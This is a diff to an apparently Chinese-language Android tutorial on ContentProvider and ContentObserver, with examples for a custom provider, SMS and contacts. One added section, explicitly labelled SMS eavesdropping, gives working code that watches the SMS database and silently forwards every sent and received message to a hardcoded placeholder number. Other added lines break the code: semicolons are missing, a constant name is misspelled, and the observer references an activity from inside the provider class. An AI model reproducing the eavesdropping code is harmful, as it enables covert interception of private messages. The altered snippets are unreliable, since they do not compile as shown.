@@ -287,7 +287,10 @@ public class PersonProvider extends ContentProvider {
                     MyDbHelper.TABLE_NAME,
                     null,
                     values);
-            mContext.getContentResolver().notifyChange(uri, null);
+            mDb.close();
+
+            mContext.getContentResolver().notifyChange(uri, null);  //notify data changed
+
             return uri;
         } else {
             throw new IllegalArgumentException("uri not matched!");
@@ -303,8 +306,11 @@ public class PersonProvider extends ContentProvider {
                     MyDbHelper.TABLE_NAME,
                     selection,
                     selectionArgs);
+
+            mDb.close();
+
             if (count > 0) {
-                mContext.getContentResolver().notifyChange(uri, null);
+                mContext.getContentResolver().notifyChange(uri, null);  //notify data changed
             }
             return count;
         } else {
@@ -322,8 +328,11 @@ public class PersonProvider extends ContentProvider {
                     values,
                     selection,
                     selectionArgs);
+
+            mDb.close();
+
             if (count > 0) {
-                mContext.getContentResolver().notifyChange(uri, null);
+                mContext.getContentResolver().notifyChange(uri, null);  //notify data changed
             }
             return count;
         } else {
@@ -340,7 +349,20 @@ public class PersonProvider extends ContentProvider {
 
     private static final String AUTHORITY = "me.rorschach.contentproviderdemo.provider";
 
-    ......
+    class MyObserver extends ContentObserver{
+
+        public MyObserver(Handler handler) {
+            super(handler);
+        }
+
+        @Override
+        public void onChange(boolean selfChange) {
+            super.onChange(selfChange);
+            
+            Toast.makeText(MainActivity.this, "data changed!", Toast.LENGTH_SHORT).show();
+        }
+        
+     }
 
     public void insert(View view) {
         Uri uri = Uri.parse("content://" + AUTHORITY + "/insert");
@@ -404,6 +426,30 @@ public class PersonProvider extends ContentProvider {
     }
 ```
 
+```
+    mContentResolver.registerContentObserver(
+        Uri.parse("content://" + AUTHORITY), 
+        true, 
+        new MyObserver(new Handler()));
+
+    ...
+
+    class MyObserver extends ContentObserver{
+
+        public MyObserver(Handler handler) {
+            super(handler);
+        }
+
+        @Override
+        public void onChange(boolean selfChange) {
+            super.onChange(selfChange);
+            
+            Toast.makeText(MainActivity.this, "data changed!", Toast.LENGHT_SHORT).show();
+        }
+     }
+
+```
+
 ## 使用ContentProvider读取和添加短信
 
 ```
@@ -413,8 +459,10 @@ public class PersonProvider extends ContentProvider {
 
 ```
     private void getSms() {
-        ContentResolver cr = getContentResolver();
+        ContentResolver cr = getContentResolver()
+
         Uri uri = Uri.parse("content://sms/");
+
         Cursor cursor = cr.query(uri,
                 new String[]{"address", "date", "type", "body"},
                 "address=?", new String[]{"12306"}, null);
@@ -432,7 +480,9 @@ public class PersonProvider extends ContentProvider {
     }
 
     private void writeSms() {
-        ContentResolver cr = getContentResolver();
+
+        ContentResolver cr = getContentResolver()
+
         Uri uri = Uri.parse("content://sms/");
 
         ContentValues cv = new ContentValues();
@@ -507,6 +557,52 @@ public class MySms {
 
 值得注意的是，上述增加短信的方式在Android4.4后失效，因为Android4.4之后只有系统默认的短信应用才能写短信到数据库中，具体信息见[官方博客](http://android-developers.blogspot.jp/2013/10/getting-your-sms-apps-ready-for-kitkat.html)。
 
+监听短信数据库变化实现短信窃听
+
+```
+    <uses-permission android:name="android.permission.SEND_SMS"/>
+```
+
+```
+    private ContentResolver cr;
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+        
+        cr = getContentResolver();
+        uri = Uri.parse("content://sms/");
+        cr.registerContentObserver(uri, true, new MyObserver(new Handler()));
+    }
+
+    class MyObserver extends ContentObserver{
+
+        public MyObserver(Handler handler) {
+            super(handler);
+        }
+
+        @Override
+        public void onChange(boolean selfChange) {
+            super.onChange(selfChange);
+            
+            Cursor cursor = cr.query(uri, new String[]{"address", "body", "type"}, null, null, null);
+            cursor.moveToFirst();
+            String address = cursor.getString(0);
+            String body = cursor.getString(1);
+            int type = cursor.getInt(2);
+            
+            if(type == 1){
+                SmsManager manager = SmsManager.getDefault();
+                manager.sendTextMessage("13XXXXXXX", null, address + " say:" + body, null, null);
+            }else if(type == 2){
+                SmsManager manager = SmsManager.getDefault();
+                manager.sendTextMessage("13XXXXXXX", null, "say to " + address + ":" + body, null, null);
+            }
+        }
+    }
+```
+
 ## 使用ContentProvider读取和添加联系人
 
 ```
@@ -557,7 +653,7 @@ public class MySms {
         
         // Uri uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;  
         // Cursor cursor = getContentResolver().query(uri,  
-        //       new String[] { "display_name", "sort_key" }, null, null, "sort_key");  
+        //       new String[] { "display_name", "data1" }, null, null, null);  
     }
 
     public void writeContact(View view) {
